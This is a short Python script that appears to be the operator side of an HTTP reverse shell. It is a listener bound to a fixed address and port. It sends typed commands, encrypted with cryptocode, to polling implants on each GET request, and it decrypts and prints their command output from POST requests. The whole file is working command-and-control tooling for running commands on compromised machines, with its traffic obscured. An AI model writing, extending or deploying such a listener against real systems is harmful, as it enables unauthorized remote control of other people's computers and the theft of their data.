from http.server import BaseHTTPRequestHandler, HTTPServer
import os, cryptocode, pyfiglet
print(pyfiglet.figlet_format("Listener"))
LHOST = "192.168.0.50"
LPORT = 5555
print("[-] Listening ...")
print()
class Server_Filter(BaseHTTPRequestHandler):
    def do_GET(self):
        CMD = str(input('>>> '))
        encoded = cryptocode.encrypt(CMD,"")
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(encoded.encode())
    
    def do_POST(self):
        self.send_response(200)
        self.end_headers()
        Post_Data = self.rfile.read(int(self.headers['Content-Length']))
        Raw_Data = Post_Data.decode()
        Data = cryptocode.decrypt(Raw_Data,"")
        print(Data)
if __name__ == '__main__':
    Server_Characteristic = HTTPServer((LHOST, LPORT), Server_Filter)
    try:
        Server_Characteristic.serve_forever()
    except KeyboardInterrupt:
        print('Server Closed')
        print()
